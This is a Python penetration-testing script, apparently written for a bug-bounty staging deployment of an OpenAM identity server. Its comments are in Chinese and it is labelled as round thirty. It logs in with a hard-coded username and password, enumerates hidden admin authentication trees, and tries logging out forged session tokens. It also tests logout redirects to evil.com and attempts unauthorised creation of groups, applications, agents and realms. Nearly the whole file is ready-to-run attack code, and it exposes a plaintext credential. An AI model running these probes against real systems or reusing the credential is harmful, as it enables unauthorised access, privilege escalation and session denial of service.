# -*- coding: utf-8 -*-
"""AIC 第三十轮:认证树枚举 + sessions logout 任意 token + endSession + groups 写操作
1. 认证树枚举(authIndexType=service):找隐藏树(admin/特权树)
2. sessions logout 他人 tokenId(会话 DoS)
3. endSession 完整流(id_token_hint)
4. groups/applications 写操作(越权创建)
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                  'Content-Type': 'application/json'})
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = S.cookies.get('aa942d46ece12ce')
print('LOGIN OK')

S2 = requests.Session()
S2.trust_env = False
S2.proxies = {'http': None, 'https': None}
S2.headers.update({'User-Agent': 'research-1643', 'Cookie': 'aa942d46ece12ce=' + tok,
                   'Content-Type': 'application/json', 'Accept-API-Version': 'resource=2.1, protocol=1.0'})

print('=== 1. 认证树枚举 ===')
trees = ['login', 'registration', 'passwordReset', 'forgotPassword', 'admin', 'adminLogin',
         'platformAdmin', 'iga-login', 'igaLogin', 'mfa', 'device', 'socialLogin', 'app-login',
         'service-login', 'internal', 'oauth2', 'idm', 'auth-tree', 'Login', 'Registration',
         'resetPassword', 'forgotUsername', 'usernameRecovery', 'self-registration', 'selfRegistration',
         'changePassword', 'password', 'adminAuth', 'openam', 'default', 'ldap', 'facebook', 'google']
found = []
for t in trees:
    try:
        r = S.post(AUTH + '?authIndexType=service&authIndexValue=' + t, json={}, timeout=10, verify=False)
        if r.status_code == 200 and 'callbacks' in r.text:
            cbs = [c['type'] for c in r.json().get('callbacks', [])]
            print('  TREE %-22s -> 200 callbacks=%s' % (t, cbs))
            found.append((t, cbs))
        elif r.status_code == 401:
            print('  TREE %-22s -> 401' % t)
        else:
            print('  TREE %-22s -> %d %s' % (t, r.status_code, r.text[:80].replace('\n', ' ')))
    except Exception as e:
        print('  TREE %-22s -> ERR %s' % (t, str(e)[:40]))
print('发现树:', [t for t, _ in found])

print('\n=== 2. sessions logout 任意 tokenId ===')
# 用假/他人格式 tokenId 测 logout
fake_tokens = ['FAKETOKEN', 'aaaa.*AAJTSQACMDIAAlNLABxYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
               tok]  # 最后一个是自己(先保存会话,最后测)
# 先测假 token(不 logout 自己)
for ft in fake_tokens[:2]:
    try:
        r = S2.post(BASE + '/am/json/realms/root/realms/alpha/sessions?_action=logout',
                    json={'tokenId': ft}, timeout=12, verify=False)
        print('logout fake token %-20s -> %d %s' % (ft[:20], r.status_code, r.text[:120].replace('\n', ' ')))
    except Exception as e:
        print('logout fake -> ERR %s' % str(e)[:50])

print('\n=== 3. endSession 完整流(id_token_hint) ===')
# 先拿 id_token
from urllib.parse import quote
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=id_token&redirect_uri=%s&scope=openid&state=t&nonce=n123' % quote('https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html', safe='')
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
frag = loc.split('#')[1] if '#' in loc else ''
idt = dict(kv.split('=') for kv in frag.split('&') if '=' in kv).get('id_token', '')
print('id_token:', idt[:50] if idt else 'NONE')
if idt:
    for ru, lab in [
        ('https://evil.com', '外域'),
        ('https://openam-bug-bounty-stag.forgeblocks.com/enduser/', '同源'),
        ('', '无'),
    ]:
        q = '?id_token_hint=' + idt + ('&post_logout_redirect_uri=' + quote(ru, safe='') if ru else '')
        try:
            r = S.get(BASE + '/am/oauth2/realms/alpha/connect/endSession' + q, timeout=12, verify=False, allow_redirects=False)
            print('endSession %-10s -> %d %s' % (lab, r.status_code, r.headers.get('Location', '')[:160]))
        except Exception as e:
            print('endSession %-10s -> ERR %s' % (lab, str(e)[:50]))

print('\n=== 4. groups/applications 写操作 ===')
for m, p, b, lab in [
    ('POST', '/am/json/realms/root/realms/alpha/groups?_action=create', {'name': 'grp1643', 'members': []}, '创建组'),
    ('POST', '/am/json/realms/root/realms/alpha/groups', {'name': 'grp1643', 'members': []}, 'POST 组'),
    ('POST', '/am/json/realms/root/realms/alpha/applications?_action=create', {'name': 'app1643'}, '创建应用'),
    ('POST', '/am/json/realms/root/realms/alpha/agents?_action=create', {'name': 'agt1643'}, '创建 agent'),
    ('POST', '/am/json/realms/root/realms/alpha/realms?_action=create', {'name': 'r1643'}, '创建 realm'),
]:
    try:
        r = S2.request(m, BASE + p, json=b, timeout=12, verify=False)
        print('%-3s %-60s -> %d %s  <= %s' % (m, p[:60], r.status_code, r.text[:120].replace('\n', ' '), lab))
    except Exception as e:
        print('%-3s %-60s -> ERR %s  <= %s' % (m, p[:60], str(e)[:50], lab))

print('\n=== 5. 会话仍有效(确认未被自己 logout) ===')
r = S2.post(BASE + '/am/json/realms/root/realms/alpha/sessions?_action=getSessionInfo',
            json={'withCredentials': True}, timeout=12, verify=False)
print('getSessionInfo:', r.status_code, r.text[:120].replace('\n', ' '))
